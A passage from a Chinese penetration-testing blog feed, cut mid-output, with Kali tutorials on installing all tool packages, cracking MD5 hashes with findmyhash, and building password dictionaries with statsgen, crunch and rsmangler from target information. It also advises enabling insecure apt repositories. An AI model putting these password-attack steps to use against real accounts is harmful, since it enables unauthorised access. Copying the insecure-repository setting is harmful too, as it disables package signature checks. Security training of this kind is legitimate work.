    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="Kali安装所有工具包"><a href="#Kali安装所有工具包" class="headerlink" title="Kali安装所有工具包"></a>Kali安装所有工具包</h2><p>通常情况下为了快速安装了使用Kali系统，我们并没有选择安装所有的工具包，在后续的渗透测试中经常有一些工具无法使用，需要我们手动安装；这里我们一次性的安装所有Kali系统的工具包。</p><h3 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/apt/sources.list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#中科大kali源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security/ kali-rolling/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security/ kali-rolling/updates main contrib non-free</span><br><span class="line"><span class="comment">#阿里云kali源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ kali-rolling/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ kali-rolling/updates main contrib non-free</span><br></pre></td></tr></table></figure><h3 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get update</span></span><br></pre></td></tr></table></figure><blockquote><p>若是出现：更新时无法安全地用该源进行更新，所以默认禁用该源解决方案，添加以下配置；</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/apt/apt.conf.d/70debconf</span></span><br><span class="line"></span><br><span class="line">Acquire::AllowInsecureRepositories <span class="string">"true"</span>;</span><br></pre></td></tr></table></figure><h3 id="安装所有工具包"><a href="#安装所有工具包" class="headerlink" title="安装所有工具包"></a>安装所有工具包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get install kali-linux-all</span></span><br></pre></td></tr></table></figure><blockquote><p>在新版本中<code>kali-linux-all</code>更名为<code>kali-linux-everything</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get install kali-linux-everything</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;Kali安装所有工具包&quot;&gt;&lt;a href=&quot;#Kali安装所有工具包&quot; class=&quot;headerlink&quot; title=&quot;Kali安
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Kali" scheme="http://chenzhonzhou.github.io/tags/Kali/"/>
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Kali 安装findmyhash</title>
    <link href="http://chenzhonzhou.github.io/2021/01/05/kali-an-zhuang-findmyhash/"/>
    <id>http://chenzhonzhou.github.io/2021/01/05/kali-an-zhuang-findmyhash/</id>
    <published>2021-01-05T10:40:02.000Z</published>
    <updated>2021-01-06T07:21:23.143Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="Kali-安装findmyhash"><a href="#Kali-安装findmyhash" class="headerlink" title="Kali 安装findmyhash"></a>Kali 安装findmyhash</h2><p>在升新版本的kali系统中，不自带findmyhash命令，因此需要自己下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git clone https://github.com/Talanor/findmyhash</span></span><br><span class="line"><span class="comment"># pip3 install -r findmyhash/dependencies.txt</span></span><br></pre></td></tr></table></figure><h3 id="安装所有的依赖包"><a href="#安装所有的依赖包" class="headerlink" title="安装所有的依赖包"></a>安装所有的依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 hash-tool.py --help</span></span><br></pre></td></tr></table></figure><p>使用<code>python3 hash-tool.py algo list</code>查看支持的加密算法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 hash-tool.py algo list</span></span><br><span class="line">CISCO7</span><br><span class="line">GOST</span><br><span class="line">JUNIPER</span><br><span class="line">LM</span><br><span class="line">MD2</span><br><span class="line">MD4</span><br><span class="line">MD5</span><br><span class="line">RIPEMD128</span><br><span class="line">RIPEMD160</span><br><span class="line">RIPEMD256</span><br><span class="line">RIPEMD320</span><br><span class="line">SHA1</span><br><span class="line">SHA224</span><br><span class="line">SHA256</span><br><span class="line">SHA384</span><br><span class="line">SHA512</span><br><span class="line">SNEFRU</span><br><span class="line">SNEFRU256</span><br><span class="line">WHIRLPOOL</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 hash-tool.py crack -a MD5 e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure><blockquote><p>-f hash.txt批量查询</p></blockquote><p>新建一个hash.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim hash.txt</span></span><br><span class="line"></span><br><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 hash-tool.py crack -a MD5 -f hash.txt</span></span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;Kali-安装findmyhash&quot;&gt;&lt;a href=&quot;#Kali-安装findmyhash&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Kali" scheme="http://chenzhonzhou.github.io/tags/Kali/"/>
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>密码攻击</title>
    <link href="http://chenzhonzhou.github.io/2021/01/05/kali-mi-ma-gong-ji/"/>
    <id>http://chenzhonzhou.github.io/2021/01/05/kali-mi-ma-gong-ji/</id>
    <published>2021-01-05T08:38:35.000Z</published>
    <updated>2021-01-07T01:43:29.249Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h1 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h1><p>密码是身份验证的重要方式。密码攻击是通过各种技术获取目标用户的密码。密码攻击是所有渗透测试的一个重要部分。因为所有系统里最不安全的环节往往就是用户使用的密码。无论密码策略如何设置，大部分人都不愿意使用复杂的密码。</p><h2 id="一、创建字典"><a href="#一、创建字典" class="headerlink" title="一、创建字典"></a>一、创建字典</h2><p>这里的字典就是密码字典。如果要实施密码攻击，密码字典是必不可少的。用户可以通过对密码信息收集并分析，创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还能缩短破解的时间。</p><h3 id="1-1-密码信息收集"><a href="#1-1-密码信息收集" class="headerlink" title="1.1 密码信息收集"></a>1.1 密码信息收集</h3><p>在创建密码字典之前，可以对密码进行收集。例如，搜集目标相关的邮箱、网站博文、推特文章、单位名称、人员名字等信息。因为大部分用户为了方便记忆，会使用最简单的密码，或者使用个人的相关信息（如单位名称、门牌号等）作为密码。此时，如果收集到这些信息，并添加到字典文件中，则能提升破解成功率。</p><h3 id="1-2-密码策略分析"><a href="#1-2-密码策略分析" class="headerlink" title="1.2 密码策略分析"></a>1.2 密码策略分析</h3><p>密码策略就是系统对用户设置的密码进行各项限制，如不能仅使用数字、不能使用连续的数字和英文字母等。例如，一些软件或系统都会设有对应的密码策略，以提高其安全性。此时，用户通过对这些设备的密码策略进行分析，可以有针对性地创建密码字典。</p><h4 id="1-2-1-软件-系统固有策略"><a href="#1-2-1-软件-系统固有策略" class="headerlink" title="1.2.1 软件/系统固有策略"></a>1.2.1 软件/系统固有策略</h4><p>固有策略就是指软件/系统本身内置的密码策略。为了安全起见，一些软件/系统都有固定的策略，以避免被轻易破解。如果软件/系统有固有策略，用户在注册账户时，会提醒密码长度、复杂度的最低要求。例如，安装Oracle数据库时，会提醒用户设置的密码是否足够复杂；安装Linux操作系统时，会提示有root用户密码设置要求等。此时，用户通过对软件/系统固有策略进行分析，可以创建对应策略的字典。</p><h4 id="1-2-2-加固策略"><a href="#1-2-2-加固策略" class="headerlink" title="1.2.2 加固策略"></a>1.2.2 加固策略</h4><p>加固策略是指软件/系统额外的建议标准。例如，在Windows系统中，会使用组策略来加固密码策略，使用户设置更安全的密码。此时，用户则可以使用组策略分析工具，以分析密码策略，然后构建更强大的密码字典。这里介绍如何使用组策略分析工具来分析密码策略。<br>使用组策略分析密码策略。具体操作步骤如下：</p><ol><li><p>使用Win+R组合键启动“运行”对话框。</p></li><li><p>在“打开”文本框中输入<code>gpedit.msc</code>命令，然后单击“确定”按钮，打开<code>本地组策略编辑器</code>界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%871.png" alt="图片1"></p></li><li><p>在左侧栏中依次选择“计算机配置”|“Windows设置”|“安全设置”|“账户策略”|“密码策略”选项，将显示密码策略设置界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%872.png" alt="图片2"></p></li><li><p>从该界面可以看到Windows系统密码策略的相关设置，如是否启用了复杂性要求、密码最小长度值、使用的期限，以及是否记住密码历史记录等。</p></li></ol><h4 id="1-2-3-分析已有密码字典策略"><a href="#1-2-3-分析已有密码字典策略" class="headerlink" title="1.2.3 分析已有密码字典策略"></a>1.2.3 分析已有密码字典策略</h4><p>用户可以分析目标用户相关人群泄漏的密码，获取同类人群的密码设定策略，然后以此构建一个新的字典。马尔可夫攻击方式（Markov Attack）可以分析已有的密码字典文件，并且统计密码字典每个字符的出现概率、位置分布以及前后关系。然后，结合这些规则，可以使用掩码生成更为有效的密码字典。Kali Linux提供了一个名为<strong><code>Stasprocessor</code></strong>工具，支持Markov Attack技术。</p><p>语法格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">statsgen [options] passwords.txt</span><br></pre></td></tr></table></figure><p>以上语法中，options表示可用的选项；<br>passwords.txt表示分析的密码字典。</p><p>其中，该工具支持的选项及含义如下：</p><blockquote><p>–version：显示版本信息。<br>-h,–help：显示帮助信息。<br>-o password.masks,–output=passwords.masks：保存掩码和统计信息到一个文件。<br>–hiderare：隐藏比例小于1%的统计项。<br>–minlength=8：过滤密码最小长度为8的密码。<br>–maxlength=8：过滤密码最大长度为8的密码。<br>–charset=loweralpha,numeric：指定过滤的密码字符，使用逗号分隔。<br>–simplemask=stringdigit,allspecial：过滤密掩码格式，使用逗号分隔。</p></blockquote><p>使用statsgen工具分析rockyou.txt密码字典。具体操作步骤如下：</p><ol><li><p>执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@daxueba:~<span class="comment"># statsgen rockyou.txt</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将开始对指定的密码字典进行分析，并进行统计。其中，输出的信息包括工具的基本统计信息、密码长度、字符集、密码复杂度、简单掩码和高级掩码。其中，第一部分信息是statsgen工具的基本信息，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                       _ </span><br><span class="line">     StatsGen 0.0.3   | |</span><br><span class="line">      _ __   __ _  ___| | _</span><br><span class="line">     | <span class="string">'_ \ / _` |/ __| |/ /</span></span><br><span class="line"><span class="string">     | |_) | (_| | (__|   &lt; </span></span><br><span class="line"><span class="string">     | .__/ \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">     | |                    </span></span><br><span class="line"><span class="string">     |_| iphelix@thesprawl.org</span></span><br><span class="line"><span class="string">[*] Analyzing passwords in [rockyou.txt]    #分析的密码</span></span><br><span class="line"><span class="string">[+] Analyzing 100% (14344392/14344392) of passwords NOTE: Statistics below is relative to the number of analyzed passwords, not total number of passwords</span></span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，statsgen工具的版本信息、分析的密码文件及对密码文件的统计。通过分析输出的信息可以看到，该工具的版本为0.0.3；分析的密码字典为rockyou.txt；该密码字典共包括14344392个密码。</p></li><li><p>下面是密码长度统计信息，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[*] Length:                   <span class="comment">#长度</span></span><br><span class="line">[+]                         8: 20% (2966037)</span><br><span class="line">[+]                         7: 17% (2506272)</span><br><span class="line">[+]                         9: 15% (2191040)</span><br><span class="line">[+]                        10: 14% (2013695)</span><br><span class="line">[+]                         6: 13% (1947798)</span><br><span class="line">[+]                        11: 06% (866035)</span><br><span class="line">[+]                        12: 03% (555350)</span><br><span class="line">[+]                        13: 02% (364174)</span><br><span class="line">[+]                         5: 01% (259169)</span><br><span class="line">[+]                        14: 01% (248527)</span><br><span class="line">[+]                        15: 01% (161213)</span><br><span class="line">[+]                        16: 00% (118406)</span><br><span class="line">[+]                        17: 00% (36884)</span><br><span class="line">[+]                        18: 00% (23769)</span><br><span class="line">[+]                         4: 00% (17899)</span><br><span class="line">[+]                        19: 00% (15567)</span><br><span class="line">[+]                        20: 00% (13069)</span><br><span class="line">[+]                        21: 00% (7850)</span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure><p>以上信息是对密码字典中的密码长度进行了统计，并按照密码长度所占比例从大到小依次排序。其中，输出的信息分为3列，分别是密码的长度、所占密码总数的比例、密码总数。例如，第一行信息表示密码长度为8，所占密码总数的比例为20%，符合该长度的密码总数为2966037。</p></li><li><p>下面是对密码字符集进行的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] Character-set:                              <span class="comment">#字符集</span></span><br><span class="line">[+]             loweralphanum: 42% (6074867)    <span class="comment">#小写字母a～z和数字0～9的字条集合</span></span><br><span class="line">[+]                loweralpha: 25% (3726130)    <span class="comment">#小写字母a～z的字符集合</span></span><br><span class="line">[+]                   numeric: 16% (2346744)    <span class="comment">#数字0～9的字符集合</span></span><br><span class="line">[+]      loweralphaspecialnum: 02% (426353)     <span class="comment">#小写字母、特殊符号和数字的字符集合</span></span><br><span class="line">[+]             upperalphanum: 02% (407431)     <span class="comment">#大写字母a～z和数字0～9的字符集合</span></span><br><span class="line">[+]             mixedalphanum: 02% (382237)     <span class="comment">#小写字母、大写字母和数字字符集合</span></span><br><span class="line">[+]         loweralphaspecial: 02% (381623)     <span class="comment">#小写字母a～z和特殊符号的字符集合</span></span><br><span class="line">[+]                upperalpha: 01% (229875)     <span class="comment">#大写字母的字符集合</span></span><br><span class="line">[+]                mixedalpha: 01% (159310)     <span class="comment">#小写字母和大写字母的字符集合</span></span><br><span class="line">[+]                       all: 00% (53238)      <span class="comment">#所有字符集合</span></span><br><span class="line">[+]         mixedalphaspecial: 00% (49655)      <span class="comment">#大写字母和特殊符号的字符集合</span></span><br><span class="line">[+]                specialnum: 00% (46606)      <span class="comment">#特殊符号的字符集合</span></span><br><span class="line">[+]      upperalphaspecialnum: 00% (27737)      <span class="comment">#大写字母、特殊符号和数字的字符集合</span></span><br><span class="line">[+]         upperalphaspecial: 00% (26813)      <span class="comment">#大写字母和特殊符号的字符集合</span></span><br><span class="line">[+]                   special: 00% (5773)       <span class="comment">#特殊符号的字符集合</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，对密码字典中各种密码字符集进行了分析和统计。</p></li><li><p>下面是对密码复杂性的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Password complexity:                        <span class="comment">#密码复杂度</span></span><br><span class="line">[+]           digit: min(0) max(255)            <span class="comment">#数字0～9</span></span><br><span class="line">[+]           lower: min(0) max(255)            <span class="comment">#小写字母a～z</span></span><br><span class="line">[+]           upper: min(0) max(187)            <span class="comment">#大写字母A～Z</span></span><br><span class="line">[+]         special: min(0) max(255)            <span class="comment">#特殊符号</span></span><br></pre></td></tr></table></figure><p>以上是对密码的复杂性进行了统计。输出的信息分为3列，分别表示构成密码可能所拥有的字符、使用这种字符在密码中的最小个数和使用这种字符在密码中的最大个数。</p></li><li><p>下面是简单掩码的统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] Simple Masks:                               <span class="comment">#简单掩码</span></span><br><span class="line">[+]               stringdigit: 37% (5339556)    <span class="comment">#字母和数字</span></span><br><span class="line">[+]                    string: 28% (4115315)    <span class="comment">#字母</span></span><br><span class="line">[+]                     digit: 16% (2346744)    <span class="comment">#数字</span></span><br><span class="line">[+]               digitstring: 04% (663951)     <span class="comment">#数字和字母</span></span><br><span class="line">[+]                 othermask: 04% (576325)     <span class="comment">#其他类型</span></span><br><span class="line">[+]         stringdigitstring: 03% (450742)     <span class="comment">#字母、数字、字母</span></span><br><span class="line">[+]       stringspecialstring: 01% (204441)     <span class="comment">#字母、特殊符号、字母</span></span><br><span class="line">[+]        stringspecialdigit: 01% (167816)     <span class="comment">#字母、特殊符号、数字</span></span><br><span class="line">[+]             stringspecial: 01% (148328)     <span class="comment">#字母和特殊符号</span></span><br><span class="line">[+]          digitstringdigit: 00% (130517)     <span class="comment">#数字、字母、数字</span></span><br><span class="line">[+]        stringdigitspecial: 00% (77378)      <span class="comment">#字母、数字、特殊符号</span></span><br><span class="line">[+]      specialstringspecial: 00% (25127)      <span class="comment">#特殊符号、字母、特殊符号</span></span><br><span class="line">[+]        digitspecialstring: 00% (16821)      <span class="comment">#数字、特殊符号、字母</span></span><br><span class="line">[+]             specialstring: 00% (14496)      <span class="comment">#特殊符号和字母</span></span><br><span class="line">[+]        digitstringspecial: 00% (12242)      <span class="comment">#数字、字母、特殊符号</span></span><br><span class="line">[+]         digitspecialdigit: 00% (12114)      <span class="comment">#数字、特殊符号、数字</span></span><br><span class="line">[+]              digitspecial: 00% (11017)      <span class="comment">#数字和特殊符号</span></span><br><span class="line">[+]        specialstringdigit: 00% (9609)       <span class="comment">#特殊符号、字母和数字</span></span><br><span class="line">[+]        specialdigitstring: 00% (8328)       <span class="comment">#特殊符号、数字和字母</span></span><br><span class="line">[+]                   special: 00% (5773)       <span class="comment">#特殊符号</span></span><br><span class="line">[+]              specialdigit: 00% (4142)       <span class="comment">#特殊符号和数字</span></span><br><span class="line">[+]       specialdigitspecial: 00% (3610)       <span class="comment">#特殊符号、数字和特殊符号</span></span><br></pre></td></tr></table></figure><p>以上信息是对密码字符串掩码格式进行了简单统计。例如，stringdigit表示前面是字母，后面是数字；stringdigitstring表示前面是字母、中间是数字、后面是字母。</p></li><li><p>下面是密码字符串掩码格式的高级统计：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[*] Advanced Masks:                             <span class="comment">#高级掩码</span></span><br><span class="line">[+]           ?l?l?l?l?l?l?l?l: 04% (687991)</span><br><span class="line">[+]               ?l?l?l?l?l?l: 04% (601152)</span><br><span class="line">[+]             ?l?l?l?l?l?l?l: 04% (585014)</span><br><span class="line">[+]          ?l?l?l?l?l?l?l?l?l: 03% (516830)</span><br><span class="line">[+]         ?l?l?l?l?l?l?l?d?d: 01% (273624)</span><br><span class="line">[+]        ?l?l?l?l?l?l?l?l?l?l?l: 01% (267733)</span><br><span class="line">[+]          ?l?l?l?l?d?d?d?d: 01% (235360)</span><br><span class="line">[+]              ?l?l?l?l?d?d: 01% (215074)</span><br><span class="line">[+]        ?l?l?l?l?l?l?l?l?d?d: 01% (213109)</span><br><span class="line">[+]              ?l?l?l?l?l?l?d: 01% (193097)</span><br><span class="line">[+]             ?l?l?l?l?l?l?l?d: 01% (189847)</span><br><span class="line">[+]       ?l?l?l?l?l?l?l?l?l?l?l?l: 01% (189355)</span><br><span class="line">[+]            ?l?l?l?d?d?d?d: 01% (178304)</span><br><span class="line">[+]          ?l?l?l?l?l?d?d?d?d: 01% (173559)</span><br><span class="line">[+]         ?l?l?l?l?l?l?d?d?d?d: 01% (160592)</span><br><span class="line">[+]            ?l?l?l?l?l?l?l?l?d: 01% (160054)</span><br><span class="line">[+]            ?l?l?l?l?l?d?d?d: 01% (152400)</span><br></pre></td></tr></table></figure><p>以上信息是对密码字符串进行了高级统计。其中，高级统计就是对密码文件中的密码字符用掩码格式进行了表示。统计后会用到4种掩码格式，每种格式都由一个？（问号）加一个小写字母来表示，表示一个字符集合。这4种掩码格式的表示及含义如下：</p><blockquote><p>?l：表示小写字母a～z的字符集合。<br>?u：表示大写字母A～Z的字符集合。<br>?d：表示数字0～9的字符集合。<br>?s：表示特殊符号的字符集合。</p></blockquote><p>在获取的掩码格式中，一个掩码表示密码中的一位数。例如，?l?l?l?l?d?d?d?d掩码格式表示由4个?l和4个?d组成的一个8位长度的密码。其中，前4位密码由小写字母a～z构成；后4位密码由数字0～9构成。</p></li></ol><h3 id="1-3-生成字典"><a href="#1-3-生成字典" class="headerlink" title="1.3 生成字典"></a>1.3 生成字典</h3><p>当用户收集足够的目标用户信息及密码策略后，就可以根据获取的信息来创建密码字典了。下面使用Crunch、rsmangler和rtgen工具生成字典。</p><h4 id="1-3-1-使用Crunch工具"><a href="#1-3-1-使用Crunch工具" class="headerlink" title="1.3.1 使用Crunch工具"></a>1.3.1 使用Crunch工具</h4><p>Crunch是一种密码字典生成工具。它可以按照指定的规则生成密码字典，用户可以灵活地定制自己的密码字典文件。</p><p>使用Crunch工具生成字典的语法格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch <span class="xml"><span class="tag">&lt;<span class="name">min</span>&gt;</span></span> <span class="xml"><span class="tag">&lt;<span class="name">max</span>&gt;</span></span> [<span class="string">&lt;charset string&gt;</span>][<span class="symbol">options</span>]</span><br></pre></td></tr></table></figure><p>以上语法中，参数<code>&lt;min&gt;</code>表示生成密码的最小长度；<code>&lt;max&gt;</code>表示生成密码的最大长度；<code>&lt;charset string&gt;</code>表示指定的字符集；<code>[options]</code>表示有效的选项。其中，常用的选项及含义如下：</p><blockquote><p>-o：指定生成的密码字典文件名；<br>-b number[type]：指定写入文件最大的字节数。该大小可以指定KB、MB或GB，但是必须与-o START选项一起使用；<br>-t：设置使用的特殊格式；<br>-l：该选项用于当-t选项指定@、%或^时，识别占位符的一些字符。</p></blockquote><p>Crunch工具默认提供的字符集保存在<code>/usr/share/crunch/charset.lst</code>文件中。此时，用户可以直接使用这些字符集来生成对应的密码字典。用户可以使用cat命令查看所有的字符集。</p><p>使用Crunch工具生成一个最小长度为8、最大长度为10的密码字典文件，并保存到<code>/root/crunch.txt</code>文件。其中，使用的字符集hex-lower，即0123456789abcdef。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crunch 8 10 hex-lower -o /root/crunch.txt                                                     2 ⨯</span></span><br><span class="line">Crunch will now generate the following amount of data: 13304332288 bytes</span><br><span class="line">12688 MB</span><br><span class="line">12 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1224736768</span><br><span class="line"></span><br><span class="line">crunch:   2% completed generating output</span><br><span class="line"></span><br><span class="line">crunch:   5% completed generating output</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，将生成一个大小为12GB的字典，共有1224736768个密码。而且，以百分比的形式显示了生成的密码进度。</p><h4 id="1-3-2-使用rsmangler工具"><a href="#1-3-2-使用rsmangler工具" class="headerlink" title="1.3.2 使用rsmangler工具"></a>1.3.2 使用rsmangler工具</h4><p>rsmangler是一个基于单词列表关键词生成字典的工具。使用该工具可以基于用户收集的信息，并利用常见密码构建规则来构建字典。</p><p>rsmangler工具的语法格式如下：</p><blockquote><p>rsmangler -f wordlist.txt -o new_passwords.txt</p></blockquote><p>以上语法中的选项及含义如下：</p><blockquote><p>-f,–file：指定输入文件，即用户收集到的密码单词。<br>-o,–output：指定生成的字典文件名称。</p></blockquote><p>使用rsmangler工具生成字典。具体操作步骤如下：</p><ol><li><p>创建一个文件，用来保存收集的密码单词。这里将创建一个名为test的文件，简单保存两个单词用来生成新的字典。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi test</span></span><br><span class="line">root</span><br><span class="line">password</span><br></pre></td></tr></table></figure></li><li><p>使用rsmangler工具生成字典，并保存到pass.txt中。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat pass.txt</span></span><br><span class="line">root</span><br><span class="line">password</span><br><span class="line">rootpassword</span><br><span class="line">passwordroot</span><br><span 